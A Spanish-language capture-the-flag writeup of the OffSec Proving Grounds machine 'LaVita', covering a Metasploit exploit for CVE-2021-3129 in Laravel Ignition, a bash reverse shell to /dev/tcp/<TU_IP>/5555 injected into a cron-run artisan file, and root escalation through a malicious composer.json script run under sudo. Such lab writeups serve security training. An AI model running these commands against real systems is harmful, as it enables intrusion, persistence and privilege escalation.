---
title: "LaVita"
description: "Writeup de la máquina LaVita de OffSec Proving Grounds: explotación de CVE-2021-3129 (Laravel Ignition RCE) para foothold como www-data, movimiento lateral a skunk mediante inyección en un cron job de artisan, y escalada a root a través de sudo composer sin contraseña (GTFOBins)."
date: 2026-11-22
creator: "OffSec"
rating: 4.0
dificultad: "Intermedia"
author: "Ghxstsec"
draft: false
type: "post"
---

LaVita | OffSec Proving Grounds Writeup
========================================

**Plataforma:** OffSec Proving Grounds · **SO:** Linux (Debian 11) · **Dificultad:** Intermedia

LaVita es una aplicación web Laravel 8.4.0 con **Facade\Ignition 2.5.0** y `APP_DEBUG`
habilitado. La combinación es vulnerable a **CVE-2021-3129**, un RCE que abusa del endpoint
`_ignition/execute-solution` para ejecutar código mediante la manipulación del log de
Laravel y cadenas phar://. El movimiento lateral se consigue inyectando código en el archivo
`artisan` de Laravel, que un cron job ejecuta periódicamente como el usuario **skunk**. La
escalada a root explota una regla sudo que permite a skunk ejecutar **composer** sin
contraseña, lo que se abusa con la técnica de GTFOBins para obtener ejecución como root.

---

## Reconocimiento

```bash
nmap -sC -sV -p- --min-rate 3000 192.168.122.38
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2
80/tcp open  http    Apache/2.4.56 (Debian)
```

El servidor web en el puerto 80 revela una aplicación Laravel. Al visitar la página
principal, se observa una plantilla W3CSS con un equipo ficticio que incluye a un miembro
llamado "Johnny Skunk", lo que sugiere la existencia de un usuario `skunk` en el sistema.

Navegando a la ruta de debug de Laravel, el stack trace expone la versión del framework
(**Laravel 8.4.0**) y de Ignition (**2.5.0**), ambas vulnerables a CVE-2021-3129.

---

## Foothold — CVE-2021-3129 (Laravel Ignition RCE)

La vulnerabilidad CVE-2021-3129 permite ejecución remota de código en aplicaciones Laravel
que tengan `APP_DEBUG=true` y Facade\Ignition ≤ 2.5.1. El exploit manipula el archivo de
log de Laravel para inyectar una cadena phar serializada que se deserializa al ser procesada
por Ignition.

```bash
msfconsole -q
use exploit/multi/php/ignition_laravel_debug_rce
set RHOSTS 192.168.122.38
set RPORT 80
set LHOST <TU_IP>
set LPORT 4444
set LOGFILE /var/www/html/lavita/storage/logs/laravel.log
exploit
```

```
[+] The target appears to be vulnerable. Laravel 8.4.0 with Ignition appears vulnerable
[*] Command shell session 1 opened
```

Se obtiene una shell como **www-data**. La flag de usuario se encuentra en
`/home/skunk/local.txt` con permisos de lectura global.

---

## Enumeración como www-data

Desde la shell de www-data se recopila información clave:

- **Kernel:** 5.10.0-25-amd64 (Debian 11.7)
- **Usuario skunk:** UID 1001, miembro de los grupos `sudo` y `www-data`
- **Laravel .env:** `APP_KEY`, `DB_PASSWORD`, ruta del log
- **Composer** instalado en `/usr/bin/composer`
- Un cron job ejecuta `php artisan` periódicamente como el usuario **skunk**

Para identificar el cron se puede usar **pspy64** o monitorear procesos manualmente:

```bash
# Monitoreo simple de procesos
while true; do ps -eo user,cmd | grep -v www-data | grep -v root | sort -u; sleep 1; done
```

Se observa que periódicamente aparece un proceso ejecutado por **skunk** que invoca
`php /var/www/html/lavita/artisan schedule:run`.

---

## Movimiento Lateral — Inyección en artisan

Dado que el archivo `artisan` pertenece al directorio web y es escribible por www-data,
se puede inyectar código PHP al inicio del archivo que se ejecutará como skunk cuando
el cron lo invoque:

```bash
# Backup del original
cp /var/www/html/lavita/artisan /tmp/artisan.bak

# Inyectar reverse shell al inicio del archivo
sed -i '2a\exec("/bin/bash -c '\''nohup bash -i >& /dev/tcp/<TU_IP>/5555 0>&1 &'\''");' \
  /var/www/html/lavita/artisan
```

En nuestra máquina, levantamos un listener:

```bash
nc -lvnp 5555
```

Al ejecutarse el cron, se recibe la conexión como **skunk**:

```
Connection received on 192.168.122.38
skunk@debian:~$
```

---

## Escalada de Privilegios — sudo composer (GTFOBins)

Como skunk, se verifica la configuración de sudo:

```bash
sudo -l
```

```
User skunk may run the following commands on debian:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/composer --working-dir=/var/www/html/lavita *
```

Skunk puede ejecutar `composer` como root sin contraseña, siempre que se use
`--working-dir=/var/www/html/lavita`. El archivo `composer.json` en ese directorio
pertenece a www-data, por lo que se puede modificar desde la shell de www-data para
agregar un script malicioso.

Desde la shell de www-data:

```bash
python3 -c "
import json
c = json.load(open('/var/www/html/lavita/composer.json'))
c['scripts'] = c.get('scripts', {})
c['scripts']['pwn'] = '/bin/bash -i'
json.dump(c, open('/var/www/html/lavita/composer.json','w'), indent=4)
"
```

Luego, como skunk, se ejecuta el script malicioso con sudo:

```bash
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script --no-interaction pwn
```

Se obtiene una shell como **root** y se puede leer `/root/proof.txt`.

---

## Resumen de la cadena de ataque

```
Internet → Puerto 80 (Apache + Laravel 8.4.0)
  └─ CVE-2021-3129: Ignition RCE → shell como www-data
       └─ Inyección en artisan (cron job como skunk)
            └─ sudo composer NOPASSWD → GTFOBins → root
```

| Paso | Técnica | Resultado |
|------|---------|-----------|
| Foothold | CVE-2021-3129 (Laravel Ignition RCE) | www-data |
| User Flag | /home/skunk/local.txt (world-readable) | ✓ |
| Lateral | Artisan cron injection | skunk |
| Root | sudo composer → GTFOBins | root |
